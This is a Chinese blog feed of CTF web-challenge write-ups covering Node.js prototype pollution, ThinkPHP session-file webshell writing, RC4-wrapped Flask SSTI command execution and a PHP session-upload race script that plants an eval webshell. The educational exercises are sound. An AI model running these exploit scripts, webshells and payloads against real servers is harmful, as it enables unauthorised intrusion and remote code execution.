        <content type="html"><![CDATA[<p>###为啥写的东西又没了，为啥总是记不住保存…</p><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p>我自己做测试时用的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var router &#x3D; express.Router();</span><br><span class="line">let app &#x3D; express();</span><br><span class="line">app.listen(4000);</span><br><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line">app.use(&#39;&#x2F;&#39;,router)</span><br><span class="line"></span><br><span class="line">function md5(s) &#123;</span><br><span class="line">  return crypto.createHash(&#39;md5&#39;)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(&#39;hex&#39;);</span><br><span class="line">&#125;</span><br><span class="line">var flag&#x3D;&#39;flag&#123;123&#125;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;* GET home page. *&#x2F;</span><br><span class="line">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;</span><br><span class="line">  res.type(&#39;html&#39;);</span><br><span class="line">  var flag&#x3D;&#39;xxxxxxx&#39;;</span><br><span class="line">  var a &#x3D; req.query.a;</span><br><span class="line">  var b &#x3D; req.query.b;</span><br><span class="line">  console.log(md5(a+flag));</span><br><span class="line">  console.log(md5(b+flag));</span><br><span class="line">  console.log(a.length);</span><br><span class="line">  console.log(b.length);</span><br><span class="line">  console.log(a!&#x3D;&#x3D;b);</span><br><span class="line">  console.log(a);</span><br><span class="line">  console.log(b);</span><br><span class="line">  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;</span><br><span class="line">  console.log(&#39;flag！！&#39;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  console.log(&#39;no！！&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; router;</span><br></pre></td></tr></table></figure><p>其实这道题目就涉及了一个比较简单的知识点</p><p><img src="1.PNG"></p><p>这是在php中两个数组进行比较，如果输入a[]=1&amp;b[]=1那么则会返回a!==b就会返回false</p><p>但是在js中不是这样的，在js中数组是对象，==或===操作符只能比较两个对象是否是同一个实例，也就是是否是同一个对象引用。目前JavaScript没有内置的操作符判断对象的内容是否相同。</p><p>所以如果我们输入的是?a[]=1&amp;b[]=1那么就可以进行绕过</p><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>这道题目是nodejs的原型链污染</p><p>但是发现username的长度进行了限制,当我在password那里传入{“a”: 1, “__proto__“: {“ctfshow”: “36dboy”}}发现得到的结果是这样的</p><p><img src="2.PNG"></p><p>很显然没有造成污染</p><p>好吧，我应该一开始就抓包看看</p><p><img src="3.PNG"></p><p>原型链污染的原理大概记录一下</p><p><img src="4.PNG"></p><p>当查询a中不存在的属性时，会向上查询a的原型，a的原型的原型…..直到找到这个属性，或者是找到object也没有找到这个属性，object的原型是null，null没有属性，于是返回未定义</p><p><img src="5.png" alt="image-20211201230147106"></p><p>可以看到b是我新定义的一个对象，因为b跟a具有相同的原型，那么b.cky就与a同样的机制，返回lsy</p><p>那么回到题目，当我传入的是{“username”:”1”,”password”:”1”,”__proto__“: {“ctfshow”: “36dboy”}},req.body来到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;<span class="comment">//object1=&#123;&#125;,object2=&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;\_\_proto\_\_&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="6.png" alt="image-20211202000622945"></p><p><img src="7.png" alt="image-20211202000755677"></p><p>object1[__proto__]={ ctfshow: ‘36dboy’ }</p><p>那么object1的原型就有了ctfshow这个属性，</p><p><img src="8.png" alt="image-20211202000931839"></p><p>从这里可以secert与user具有相同的原型，于此secert.ctfshow=36dboy,得到flag</p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><p>这道题目与上述题目不同的一点是,这个flag是啥我不知道。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>所以没有办法进行上一步的操作，所以只能另求它法，注意到这道题目的源码比上一道题目多给了一个api.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(query);</span><br><span class="line">  res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>这里面的Function(query)(query)相当于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">query</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">eval</span>(query)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020_EasyThinking</title>
      <link href="/2021/11/29/GYCTF2020-EasyThinking/"/>
      <url>/2021/11/29/GYCTF2020-EasyThinking/</url>
      
        <content type="html"><![CDATA[<p>先扫一下目录，一般做这种题目的时候都会想一下扫目录，发现存在www/zip，下载源码</p><p>然后观察界面，发现有注册，登录，搜索，退出这三个功能</p><p>感觉漏洞点应该会出现在搜索这里，打开源码，全局搜索一下search</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> public function search()</span><br><span class="line">&#123;</span><br><span class="line">    if (Request::isPost())&#123;</span><br><span class="line">        if (!session(&#39;?UID&#39;))&#x2F;&#x2F;session(&#39;?UID&#39;)判断名称为name的session值是否已经设置</span><br><span class="line">        &#123;</span><br><span class="line">            return redirect(&#39;&#x2F;home&#x2F;member&#x2F;login&#39;);         &#x2F;&#x2F;如果没有设置就重定向到login   </span><br><span class="line">        &#125;</span><br><span class="line">        $data &#x3D; input(&quot;post.&quot;);</span><br><span class="line">        $record &#x3D; session(&quot;Record&quot;);&#x2F;&#x2F;取值</span><br><span class="line">        if (!session(&quot;Record&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            session(&quot;Record&quot;,$data[&quot;key&quot;]);</span><br><span class="line">        &#125;&#x2F;&#x2F;给session进行赋值</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $recordArr &#x3D; explode(&quot;,&quot;,$record);&#x2F;&#x2F;将字符串打散成数组</span><br><span class="line">            $recordLen &#x3D; sizeof($recordArr);&#x2F;&#x2F;返回数组中元素的个数</span><br><span class="line">            if ($recordLen &gt;&#x3D; 3)&#123;</span><br><span class="line">                array_shift($recordArr);&#x2F;&#x2F;删除第一个元素</span><br><span class="line">                session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]);&#x2F;&#x2F;这里把我们传入的数据添加到了session中</span><br><span class="line">                return View::fetch(&quot;result&quot;,[&quot;res&quot; &#x3D;&gt; &quot;There&#39;s nothing here&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">        return View::fetch(&quot;result&quot;,[&quot;res&quot; &#x3D;&gt; &quot;There&#39;s nothing here&quot;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return View(&quot;search&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.cn/phpkj/thinkphp/441728.html">ThinkPhp任意文件读取成因</a></p><p>从上述资料中可知，我们控制写入的文件名，前提是文件名的长度是32位，然后再利用key传入我们我们的恶意代码</p><p>所以在注册的时候</p><p><img src="1.png"></p><p>然后在搜索的时候输入<?php @eval($_POST[a]);?></p><p><img src="2.png"></p><p><img src="3.png"></p><p>我们知道session文件存在的路径是sess_XXX</p><p><img src="4.png"></p><p>发现需要绕过disable_function</p><p>先连上蚁剑</p><p><img src="5.png"></p><p>可以看到我们上传的文件，是经过序列化操作，只要将session内容反序列化即可getshell</p><blockquote><p>如果要 getshell 的话，后端需要有类似的 Session::Set(‘name’,$_POST[‘i’]) 代码才可以利用</p></blockquote><p>然后利用上传php突破disable_function的exp才可以，我们选择上传到</p><p><img src="6.png"></p><p>根据php版本，选择的是</p><blockquote><p>C:\Users\12230\Desktop\WEB\绕过disable_function\exploits-master\php-filter-bypass</p></blockquote><p>修改文件中pwn,</p><p><img src="7.png"></p><p>得到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019_华东南赛区_Double_Secret</title>
      <link href="/2021/11/29/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
      <url>/2021/11/29/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
      
        <content type="html"><![CDATA[<p>扫描目录，发现存在secret目录，然后传入参数?secret=asd sadasq(随便传)使其报错</p><p><img src="1.PNG"></p><p>其实在比赛的时候，我一旦看到有没有见过的知识就会失去思考的能力，而这个能力是在日常训练中得到了</p><p>web应用的本质：</p><li> 浏览器发送一个http请求<li> 服务器收到请求之后，生成一个html文档<li> 服务器把html文档作为http响应的body发送给浏览器<li> 浏览器收到http响应，从http body取出html文档并显示<blockquote><p>wsgi:wsgi可以起到接口作用, 前面对接服务器,后面对接app具体功能</p></blockquote><p><img src="2.png"></p><li> environ:一个包含所有http请求信息的dict对象<li> start_response:一个发送http响应的函数<p>当请求发过来的时候，调用了__call__方法，实际上调用的是wsgi_app的方法，同时传入了environ与start_response</p><p><img src="3.png"></p><p>可以看到设置了预处理,错误处理<br>sys.exc_info()获取异常处理</p><p><img src="5.png"></p><p>这里应该就是漏洞点了，采用的加密方法是rc4，秘钥是HereIsTreasure，然后存在ssti漏洞</p><p>在网上找的rce解密脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box &#x3D; rc4_init_sbox(key)</span><br><span class="line">    crypt &#x3D; str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box &#x3D; list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res &#x3D; []</span><br><span class="line">    i &#x3D; j &#x3D; 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i &#x3D; (i + 1) % 256</span><br><span class="line">        j &#x3D; (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] &#x3D; box[j], box[i]</span><br><span class="line">        t &#x3D; (box[i] + box[j]) % 256</span><br><span class="line">        k &#x3D; box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span><br><span class="line">    cipher &#x3D; &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    #print(&quot;加密后的输出(经过编码):&quot;)</span><br><span class="line">    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).\x72\x65\x61\x64()\&quot;)&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配合ssti得到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>笑死我啦，我刚开始写的是popen(‘whoami’)，然后出来的一直就是<br>‘read’ is not allowed. Secret is glzjin，我就在想怎么绕过，后来才发现whoami显示的就是glzjin</p><p>这道题目对于我来说，一开始的没有想到随便输入其实产生报错，如果在比赛中我看到报错的话可能会放弃不会在继续下去了，要一步一步的看代码，web最重要的还是审计</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2021/11/29/NPUCTF2020-ezinclude/"/>
      <url>/2021/11/29/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<p>题目打开后，看到有提示</p><p><img src="1.png"></p><p>抓包</p><p><img src="2.png"></p><p>尝试在线解密，发现无法解密</p><p>然后猜测是传参?pass=fa25e54758d5d5c1927781a6ede89f8a</p><p><img src="3.png"></p><p>然后就可以看到重定向到了flflflflag.php</p><p>访问，发现存在文件包含漏洞</p><p>然后读取源码,?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>把data，input过滤之后就没有办法进行命令执行了，想到使用万能的sessio包含</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;http:&#x2F;&#x2F;69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81&#x2F;flflflflag.php&#39;</span><br><span class="line">sessid &#x3D; &#39;lucky&#39;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;ls &#x2F;&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);echo md5(&#39;1&#39;);?&gt;&quot;&#125;,</span><br><span class="line">            files&#x3D;&#123;&quot;file&quot;:(&#39;a.txt&#39;, f)&#125;,</span><br><span class="line">            cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response &#x3D; session.get(f&#39;&#123;host&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;sessid&#125;&#39;)</span><br><span class="line">        # print(response.text)</span><br><span class="line">        if &#39;c4ca4238a0b923820dcc509a6f75849b&#39; not in response.text:</span><br><span class="line">            print(&#39;[+++]retry&#39;)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 &#x3D; threading.Thread(target&#x3D;POST, args&#x3D;(session, ))</span><br><span class="line">    t1.daemon &#x3D; True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功之后，读取phpinfo（），得到flag</p><p>#预期解</p><p>使用御剑扫描会发现dir.php,这个列出了/tmp下的所有目录，使用php7 segment fault</p><p>segmen default是指访问的内存超过了系统给这个程序的内存，从而发生了程序退出，缓存文件就保留在了tmp目录。向php发送含有文件区块的数据包时，让php异常退出，post临时文件就被保留</p><p>让php崩溃的payload:</p><ul><li>php&lt;7.2:php://filter/string.strip_tags/resource=/etc/passwd</li><li>php 老版本通杀：php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</li></ul><p>脚本：</p><pre><code>import requestsfrom io import BytesIOurl=&quot;http://69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php phpinfo();?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感觉对session上传还是不那么熟悉，可能是见得比较少，要抓紧时间复习<br>由</p><p>对于这个新特性这次是第一次见，漏洞原理大概清楚了，但是对于这个payload还是不是特别理解，要进一步跟进</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2021/11/24/%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/11/24/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>论不到剑的西湖</title>
      <link href="/2021/11/23/%E8%AE%BA%E4%B8%8D%E5%88%B0%E5%89%91%E7%9A%84%E8%A5%BF%E6%B9%96/"/>
      <url>/2021/11/23/%E8%AE%BA%E4%B8%8D%E5%88%B0%E5%89%91%E7%9A%84%E8%A5%BF%E6%B9%96/</url>
      
        <content type="html"><![CDATA[<h1 id="EZUpload"><a href="#EZUpload" class="headerlink" title="EZUpload"></a>EZUpload</h1><pre><code>&lt;?phperror_reporting(0);require &#39;vendor/autoload.php&#39;;$latte = new Latte\Engine; //这应该是自己写的一个类$latte-&gt;setTempDirectory(&#39;tempdir&#39;);//设置临时目录$policy = new Latte\Sandbox\SecurityPolicy;$policy-&gt;allowMacros([&#39;block&#39;, &#39;if&#39;, &#39;else&#39;,&#39;=&#39;]);$policy-&gt;allowFilters($policy::ALL);$policy-&gt;allowFunctions([&#39;trim&#39;, &#39;strlen&#39;]);//只能允许的方法是trim,strlen$latte-&gt;setPolicy($policy);$latte-&gt;setSandboxMode();$latte-&gt;setAutoRefresh(false);if(isset($_FILES[&#39;file&#39;]))&#123;    $uploaddir = &#39;/var/www/html/tempdir/&#39;;    $filename = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    if(stristr($filename,&#39;p&#39;) or stristr($filename,&#39;h&#39;) or stristr($filename,&#39;..&#39;))&#123;        die(&#39;no&#39;);    &#125;//上传文件的名字不能含有p,h,以及..由此可知可以上传user.ini    $file_conents = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);//读取文件内容    if(strlen($file_conents)&gt;28 or stristr($file_conents,&#39;&lt;&#39;))&#123;        die(&#39;no&#39;);    &#125;//文件内容长度不能超过28，以及不能含有‘&lt;’    $uploadfile = $uploaddir . $filename;    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;        $message = $filename .&quot; was successfully uploaded.&quot;;    &#125; else &#123;        $message = &quot;error!&quot;;    &#125;    $params = [        &#39;message&#39; =&gt; $message,    ];    $latte-&gt;render(&#39;tempdir/index.latte&#39;, $params);&#125;else if($_GET[&#39;source&#39;]==1)&#123;    highlight_file(__FILE__);&#125;else&#123;    $latte-&gt;render(&#39;tempdir/index.latte&#39;, [&#39;message&#39;=&gt;&#39;Hellow My Glzjin!&#39;]);&#125;</code></pre><h1 id="灏妹的web"><a href="#灏妹的web" class="headerlink" title="灏妹的web"></a>灏妹的web</h1><blockquote><p>.DS_Store</p><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。</p></blockquote><p>##DS_Store文件泄漏</p><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。</p><p>##解题<br>先用dirsearch扫描，发现存在.DS_Story文件泄露，然后使用ds_store_exp(python2的环境)进行下一步扫描</p><p>使用方法</p><blockquote><p>python2 ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p></blockquote><p><img src="1.png"></p><p>（图片来源于feng师傅的博客，因为比赛是没有做出来，<a href="https://ego00.blog.csdn.net/article/details/121451954" title="feng师傅">师傅博客地址</a>）</p><p>发现存在dataSources，就是IDEA里面配置数据库源可以海子街在idea里面执行sql语句的东西。但是下载的是403，没有这个东西</p><p>查了一下这个东西应该是dataSources.xml,访问即可得到flag</p><p><img src="2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/23/hello-world/"/>
      <url>/2021/11/23/hello-world/</url>
      
